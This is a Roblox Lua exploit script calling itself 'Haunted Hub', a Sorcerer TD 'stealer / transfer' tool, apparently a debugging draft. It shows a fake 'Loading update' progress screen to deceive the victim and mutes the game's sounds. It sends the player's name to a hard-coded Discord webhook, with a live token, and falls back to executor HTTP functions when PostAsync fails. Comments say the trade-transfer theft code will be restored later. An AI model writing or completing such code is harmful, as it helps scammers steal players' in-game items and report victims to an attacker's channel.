-- Haunted Hub ðŸ‘» - Sorcerer TD stealer / transfer (Arcus X Neo compatibility attempt)
-- Moved GUI to PlayerGui, added debug prints, fallback http

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local TeleportService = game:GetService("TeleportService")
local SoundService = game:GetService("SoundService")

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

print("[DEBUG] Script started execution")

wait(2)
print("[DEBUG] Waited 2s, attempting to create GUI")

-- CONFIG
local WEBHOOK = "https://discord.com/api/webhooks/1457853335754248432/t6Q4gvQjdLRy52bD70vwYyjQpYIU9O6qvUovKtlGpEiB67xmvt62idiUT8qxDY9ZvAwG"
local WHITELIST = {4946984979} -- change to your UserId

-- Try to create GUI in PlayerGui instead of CoreGui
local sg = Instance.new("ScreenGui")
sg.Name = "HauntedHubLoading"
sg.ResetOnSpawn = false
sg.Parent = PlayerGui   -- <--- changed from CoreGui
print("[DEBUG] ScreenGui created in PlayerGui")

local bg = Instance.new("Frame", sg)
bg.Size = UDim2.new(1,0,1,0)
bg.BackgroundColor3 = Color3.new(0.08, 0.08, 0.08)

local title = Instance.new("TextLabel", bg)
title.Size = UDim2.new(0.7,0,0.12,0)
title.Position = UDim2.new(0.15,0,0.25,0)
title.BackgroundTransparency = 1
title.Text = "Haunted Hub ðŸ‘»"
title.TextColor3 = Color3.fromRGB(255, 140, 0)
title.TextScaled = true
title.Font = Enum.Font.Creepster

local msg = Instance.new("TextLabel", bg)
msg.Size = UDim2.new(0.6,0,0.06,0)
msg.Position = UDim2.new(0.2,0,0.42,0)
msg.BackgroundTransparency = 1
msg.TextColor3 = Color3.new(1,1,1)
msg.TextScaled = true
msg.Font = Enum.Font.Gotham
msg.Text = "Initializing..."

local bar = Instance.new("Frame", bg)
bar.Size = UDim2.new(0.5,0,0.025,0)
bar.Position = UDim2.new(0.25,0,0.52,0)
bar.BackgroundColor3 = Color3.new(0.18,0.18,0.18)

local fill = Instance.new("Frame", bar)
fill.Size = UDim2.new(0,0,1,0)
fill.BackgroundColor3 = Color3.fromRGB(60, 200, 60)

print("[DEBUG] Basic GUI elements created")

-- Simple loading animation
local percent = 0
spawn(function()
    while percent < 150 do   -- will go past 100 and then stop
        percent = percent + 1
        msg.Text = "Loading update... " .. math.min(percent, 100) .. "%"
        TweenService:Create(fill, TweenInfo.new(0.8), {Size = UDim2.new(math.min(percent/100,1),0,1,0)}):Play()
        wait(0.9 + math.random()*1.2)
    end
    wait(3)
    sg:Destroy()
    print("[DEBUG] Fake loading ended after timeout")
end)

-- Mute attempt (less aggressive)
for _, v in ipairs(game:GetDescendants()) do
    if v:IsA("Sound") then
        pcall(function() v.Volume = 0 end)
    end
end

-- Try alternative http methods
local function trySendWebhook(link)
    local payload = HttpService:JSONEncode({
        content = "Test from " .. LocalPlayer.Name,
        embeds = {{title = "Webhook Test", description = link or "no link"}}
    })

    local success, err

    -- Try standard PostAsync
    success, err = pcall(function()
        HttpService:PostAsync(WEBHOOK, payload, Enum.HttpContentType.ApplicationJson)
    end)

    if success then
        print("[DEBUG] Webhook sent via PostAsync")
        return
    end

    print("[DEBUG] PostAsync failed: " .. tostring(err))

    -- Fallback: some exploits prefer request() or http_request()
    if request or http_request then
        local func = request or http_request
        success, err = pcall(function()
            func({
                Url = WEBHOOK,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = payload
            })
        end)
        if success then
            print("[DEBUG] Webhook sent via request/http_request")
        else
            print("[DEBUG] request/http_request failed: " .. tostring(err))
        end
    else
        print("[DEBUG] No alternative http function found")
    end
end

-- Run webhook test right away
print("[DEBUG] Attempting webhook send...")
trySendWebhook("test-link")

-- Rest of the logic (trade / hop) can stay the same for now
-- If GUI and webhook work, we can add back the full transfer code

print("[DEBUG] End of script reached")
